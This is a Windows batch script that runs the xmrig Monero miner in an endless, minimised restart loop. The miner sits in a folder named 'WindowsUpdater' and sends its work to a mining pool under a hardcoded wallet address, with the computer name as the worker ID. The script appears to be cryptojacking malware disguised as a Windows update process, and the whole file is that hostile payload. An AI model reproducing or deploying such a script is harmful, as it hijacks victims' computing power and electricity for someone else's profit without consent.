@echo off 
:loop 
start /min "" "C:\ProgramData\WindowsUpdater\xmrig.exe" -o gulf.moneroocean.stream:10128 -u 49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon -p %COMPUTERNAME% -a rx/0 -k 
timeout /t 10 
goto loop 
